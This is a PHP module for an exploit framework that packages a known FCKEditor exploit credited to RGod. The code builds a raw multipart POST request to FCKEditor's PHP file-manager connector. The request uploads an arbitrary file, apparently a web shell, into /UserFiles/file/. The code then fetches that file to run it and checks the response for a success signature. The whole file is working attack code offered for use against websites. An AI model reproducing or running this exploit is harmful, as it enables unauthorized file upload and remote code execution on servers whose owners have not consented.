<?php

/*
  FCKEditor Exploit, by RGod, modified as an ouroboros module by Nomenumbra
*/

class fck extends Xploit {

function Sploit($host,$port,$path,$filename,$filecontent)
{

  $upload_command= 'FileUpload';  
  $shellpath = $host."/UserFiles/file/".$filename;
  $dAtA="-----------------------------7d529a1d23092a\r\n";
  $dAtA.="Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
  $dAtA.="Content-Type:\r\n\r\n";
  $dAtA.="$filecontent\r\n";
  $dAtA.="-----------------------------7d529a1d23092a--\r\n";
  $pAcKeT="POST ".$path."editor/filemanager/browser/default/connectors/php/";
  $pAcKeT.="connector.php?Command=".$upload_command."&Type=File&CurrentFolder= HTTP/1.1\r\n";
  $pAcKeT.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
  $pAcKeT.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) \r\n";
  $pAcKeT.="Host: ".$host."\r\n";
  $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
  $pAcKeT.="Connection: Close\r\n\r\n";
  $pAcKeT.=$dAtA;
  $HtMl = sendpacket($host,$port,$pAcKeT);
  $packet="GET ".$shellpath." HTTP/1.1\r\n";
  $packet.="User-Agent: GoogleBot/1.1\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $html = sendpacket($host,$port,$packet);
  if (eregi($MAIN['signature'],$HtMl))
    return true;
  else
    return false;
}  

}


?>